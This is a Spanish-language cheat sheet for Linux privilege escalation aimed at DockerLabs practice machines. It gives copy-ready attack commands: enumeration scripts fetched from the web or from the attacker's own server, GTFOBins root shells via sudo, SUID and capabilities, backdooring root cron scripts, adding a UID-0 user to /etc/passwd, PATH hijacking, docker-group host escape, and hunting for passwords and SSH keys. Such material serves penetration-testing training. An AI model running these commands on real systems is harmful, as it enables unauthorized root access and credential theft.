# Chuleta de Escalada de Privilegios en Linux para DockerLabs

Guía de referencia rápida para cuando ya tienes una shell como usuario normal y necesitas llegar a root. Cada sección explica la técnica, por qué funciona y trae el comando listo para copiar.

---

## 1. Enumeración automática (siempre el primer paso)

Antes de probar técnicas manuales, corre un script de enumeración automática: te ahorra horas revisando a mano.

- **LinPEAS** → el más completo, revisa decenas de vectores (SUID, cron, capabilities, kernel, credenciales, etc) y resalta en colores lo más prometedor.

  ```bash
  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```

- **linux-smart-enumeration (lse)** → alternativa más liviana y ordenada por niveles de "interés" (0, 1, 2).

  ```bash
  curl -L https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh -o lse.sh
  chmod +x lse.sh
  ./lse.sh -l1
  ```

- Si no tienes internet en la máquina víctima, sirve levantar un servidor HTTP simple desde tu equipo y descargarlo por `wget`/`curl`:

  ```bash
  # En tu equipo, en la carpeta donde está linpeas.sh
  python3 -m http.server 8000
  # En la máquina víctima
  curl http://<TU_IP>:8000/linpeas.sh -o linpeas.sh
  ```

---

## 2. `sudo -l` — permisos de sudo del usuario actual

Muestra qué comandos puede correr el usuario con `sudo` sin necesidad de conocer la contraseña de root, y si alguno de ellos requiere contraseña o no (`NOPASSWD`).

```bash
sudo -l
```

Si aparece algún binario en la lista, revisa **GTFOBins** (gtfobins.github.io) — es una base de datos que indica cómo abusar de binarios comunes (find, vim, python, less, etc) ejecutados vía sudo para obtener una shell de root. Ejemplo clásico con `find`:

```bash
sudo find . -exec /bin/sh -p \; -quit
```

---

## 3. Binarios con permiso SUID/SGID

Un binario con bit **SUID** se ejecuta con los permisos de su dueño (no de quien lo corre) — si el dueño es root, cualquier usuario que lo ejecute obtiene ese poder momentáneamente.

- Buscar todos los binarios SUID del sistema:

  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```

- Buscar binarios SGID (equivalente pero con el grupo dueño):

  ```bash
  find / -perm -2000 -type f 2>/dev/null
  ```

- Igual que con sudo, cada binario encontrado se busca en **GTFOBins** para ver su método de explotación específico. Ejemplo con `find` como SUID:

  ```bash
  find . -exec /bin/sh -p \; -quit
  ```

---

## 4. Capabilities (capacidades de Linux)

Las *capabilities* dan permisos específicos a un binario (como poder saltarse chequeos de UID) sin necesidad de SUID completo — pero igual pueden ser una puerta a root.

- Listar binarios con capabilities asignadas:

  ```bash
  getcap -r / 2>/dev/null
  ```

- La capability `cap_setuid+ep` en un binario como python es explotable directo:

  ```bash
  python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
  ```

---

## 5. Tareas programadas (cron jobs)

Si un script que corre root vía cron es editable por tu usuario, puedes inyectar código que se ejecute con privilegios de root en la próxima ejecución.

- Ver las tareas cron del sistema (requiere revisar como root normalmente, pero suele ser legible):

  ```bash
  cat /etc/crontab
  ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
  ```

- Buscar específicamente scripts llamados desde cron que sean escribibles por tu usuario:

  ```bash
  find / -writable -type f 2>/dev/null | grep -E "cron|\.sh$"
  ```

- Si encuentras un script escribible que corre como root, agrégale una línea que te dé una shell (o copie bash con SUID):

  ```bash
  echo 'chmod +s /bin/bash' >> /ruta/al/script_root.sh
  ```

---

## 6. Archivos y carpetas con permisos de escritura mal configurados

- **`/etc/passwd` escribible** → puedes agregar un usuario propio con UID 0 (root). Genera el hash de la contraseña con `openssl`:

  ```bash
  openssl passwd -1 -salt abc password123
  echo 'hacker:$1$abc$HASH_GENERADO:0:0:root:/root:/bin/bash' >> /etc/passwd
  su hacker
  ```

- **`/etc/shadow` escribible** → puedes sobreescribir directamente el hash de la contraseña de root.
- Buscar archivos/carpetas del sistema con permisos de escritura para "otros" (mundo escribible):

  ```bash
  find / -writable -type d 2>/dev/null | grep -v -E "^/(proc|sys)"
  ```

---

## 7. PATH hijacking / secuestro de variable de entorno

Si un script o binario ejecutado como root llama a otro comando **sin ruta absoluta** (ej. solo `cp` en vez de `/bin/cp`), y tu directorio actual o uno escribible aparece antes en el `$PATH`, puedes crear un binario falso con ese nombre.

```bash
# Crea un binario falso llamado igual que el comando vulnerable
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/cp
chmod +x /tmp/cp
export PATH=/tmp:$PATH
# Espera/gatilla la ejecución del script/binario vulnerable como root
```

---

## 8. Kernel y exploits conocidos

Cuando la enumeración de configuración no da resultado, el problema puede ser una versión de kernel vulnerable.

- Revisar versión del kernel y distro:

  ```bash
  uname -a
  cat /etc/os-release
  ```

- Buscar exploits conocidos para esa versión (manual, en fuentes como exploit-db o searchsploit):

  ```bash
  searchsploit linux kernel <versión>
  ```

- Ejemplos famosos que aparecen seguido en labs: **DirtyCow** (kernels antiguos), **DirtyPipe** (kernels 5.8-5.16), **PwnKit/CVE-2021-4034** (polkit, muy común y confiable). PwnKit se explota fácil si `pkexec` existe:

  ```bash
  # buscar exploit público "PwnKit" o "CVE-2021-4034" y compilarlo/correrlo según el repo
  ls -la /usr/bin/pkexec
  ```

---

## 9. Grupo `docker` / escape de contenedores

Si tu usuario pertenece al grupo `docker`, puedes montar el disco raíz del host dentro de un contenedor y así leer/escribir como root fuera del contenedor.

- Verificar si perteneces al grupo:

  ```bash
  groups
  id
  ```

- Si aparece `docker` en la lista, monta la raíz del host y entra con una shell de root:

  ```bash
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  ```

---

## 10. Búsqueda de credenciales en el sistema

Muchas veces la escalada no es técnica sino de "reciclaje" de contraseñas dejadas en archivos de configuración, backups o historiales.

```bash
# Archivos de configuración con posibles contraseñas
grep -ri "password" /etc/*.conf /var/www/**/*.php 2>/dev/null

# Historial de comandos del usuario y de otros
cat ~/.bash_history

# Backups y archivos de configuración típicos
find / -name "*.bak" -o -name "*.old" -o -name "*config*" 2>/dev/null

# Claves privadas SSH accesibles
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null
```

---

## 11. NFS con `no_root_squash`

Si un recurso NFS del sistema está exportado con la opción `no_root_squash`, un archivo creado como root desde tu propia máquina atacante mantiene el UID 0 al copiarlo al recurso compartido.

- Revisar exports NFS visibles:

  ```bash
  cat /etc/exports 2>/dev/null
  showmount -e <IP>
  ```

- Si hay `no_root_squash`, monta el recurso desde tu máquina (como root), crea un binario SUID de bash, y ejecútalo desde la víctima.

---

## 12. Combo recomendado para DockerLabs

Flujo típico una vez que tienes shell de usuario normal:

```bash
# Paso 1: enumeración automática completa
./linpeas.sh > linpeas_resultado.txt

# Paso 2: revisar manualmente los vectores más rápidos de confirmar
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null

# Paso 3: si algo apareció en sudo -l o SUID, buscarlo en GTFOBins
# (https://gtfobins.github.io) para el comando exacto de explotación

# Paso 4: si nada dio resultado, revisar cron, permisos de escritura
# y por último la versión de kernel para exploits públicos
```

---

### Notas rápidas

- Siempre corre la enumeración automática primero (LinPEAS/lse) — te ahorra descartar manualmente decenas de rutas sin resultado.
- Cada binario SUID/sudo encontrado se busca por nombre en **gtfobins.github.io** antes de intentar nada manual: casi siempre ya está documentado el método exacto.
- Guarda la salida de la enumeración (`> archivo.txt`) para revisarla con calma y no perder pistas.
- El orden sugerido (sudo → SUID → capabilities → cron → escritura → kernel) va de lo más rápido de explotar a lo más lento/arriesgado.
